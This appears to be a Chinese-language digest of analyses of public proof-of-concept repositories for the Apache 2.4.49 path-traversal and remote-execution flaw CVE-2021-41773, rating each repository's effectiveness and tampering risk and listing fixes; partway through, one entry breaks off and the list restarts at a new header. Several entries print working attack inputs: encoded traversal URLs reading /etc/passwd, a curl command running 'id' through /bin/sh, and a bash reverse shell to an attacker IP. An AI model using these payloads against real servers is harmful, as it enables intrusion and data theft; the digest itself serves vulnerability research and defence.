利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

